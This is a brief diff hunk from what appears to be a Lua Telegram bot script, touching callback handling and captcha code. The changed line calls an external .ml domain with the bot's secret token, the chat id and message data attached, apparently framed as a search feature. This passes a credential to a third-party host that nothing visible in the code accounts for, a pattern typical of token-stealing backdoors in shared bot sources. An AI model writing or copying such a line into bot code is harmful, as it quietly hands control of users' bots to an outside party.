@@ -9914,7 +9914,7 @@ https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callb
 return false
 end
 https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
-https.request("https://vvvzvv.ml/Ali/searchinbot.php?token="..token.."&chat_id="..Chat_id.."&data="..URL.escape(DAata).."&n=do")
+https.request("https://vvvzvv.ml/Cc/searchinbot.php?token="..token.."&chat_id="..Chat_id.."&data="..URL.escape(DAata).."&n=do")
 end
 Ok_id  = DAata:match("(%d+)")  
 if DAata == 'okCaptcha'..data.sender_user_id_ then  
